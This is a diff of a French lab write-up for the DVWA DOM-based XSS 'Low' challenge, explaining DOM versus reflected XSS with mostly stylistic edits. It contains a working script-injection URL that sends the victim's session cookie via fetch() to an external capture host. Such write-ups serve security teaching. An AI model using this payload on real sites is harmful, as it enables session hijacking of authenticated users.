@@ -1,6 +1,6 @@
 # Niveau "Low"
 
-Ce challenge nous propose de pouvoir choisir la langue désirée parmi une liste déroulante :
+Ce challenge propose de pouvoir choisir la langue désirée parmi une liste déroulante :
 
 ![](../../../../.gitbook/assets/78714abbe98f58a09745e8a3bca721d6.png)
 
@@ -12,11 +12,11 @@ Voici la requête visualisée via Burp :
 
 ![](../../../../.gitbook/assets/dbdb7b36e704d06cd0c309925c0fac80.png)
 
-On modifie alors directement la valeur de ce paramètre en injection un script :
+Je modifie alors directement la valeur de ce paramètre en injectant un script :
 
 ![](../../../../.gitbook/assets/37e46a651a2ffa75df8fac16de705fb1.png)
 
-Cela fonctionne et ressemble fortement à une XSS réfléchie. Il est possible d'aller plus loin en récupérant le jeton de session de la victime \(authentifiée\) :
+Cela fonctionne et ressemble fortement à une XSS réfléchie. Il est possible d'aller plus loin en récupérant le jeton de session de la victime (authentifiée) :
 
 ```http
 http://192.168.56.203:8080/vulnerabilities/xss_d/?default=%3Cscript%3Efetch(%27https://domxss.free.beeceptor.com?cookie=%27+document.cookie);%3C/script%3E
@@ -24,9 +24,9 @@ http://192.168.56.203:8080/vulnerabilities/xss_d/?default=%3Cscript%3Efetch(%27h
 
 ![](../../../../.gitbook/assets/aded7d9ebd1e5ceac370b117e448738d.png)
 
-C'était plutôt simple puisque le serveur n'effectue aucun filtrage. Mais quelle est la différence entre la faille XSS basée sur le DOM \(DOM XSS\) et la XSS réfléchie ?
+C'était plutôt simple puisque le serveur n'effectue aucun filtrage. Mais quelle est la différence entre la faille XSS basée sur le DOM (DOM XSS) et la XSS réfléchie ?
 
-La XSS DOM s'effectue en local au sein du navigateur lui-même, très souvent quelques lignes de javascript modifiant le DOM à la volée. Dans le cas du challenge DVWA, la liste déroulante est mise à jour par le Javascript suivant \(visible dans le code HTML\) :
+La XSS DOM s'effectue en local au sein du navigateur lui-même, très souvent quelques lignes de javascript modifiant le DOM à la volée. Dans le cas du challenge DVWA, la liste déroulante est mise à jour par le Javascript suivant (visible dans le code HTML) :
 
 ```markup
 <form name="XSS" method="GET">
@@ -64,9 +64,6 @@ Pour preuve, voici la requête associée :
 
 ![](../../../../.gitbook/assets/c3a6645c7ed9301c4f6a1c01a3375be0.png)
 
-Le vol de cookie va par contre fonctionner de la même façon, mais cela permet de contourner tous les contrôles implémentés côté serveur \(si présents\) :
+Le vol de cookie va par contre fonctionner de la même façon, mais cela permet de contourner tous les contrôles implémentés côté serveur (si présents) :
 
 ![](../../../../.gitbook/assets/26008712a316600e83ce5e1a894b0478.png)
-
-
-
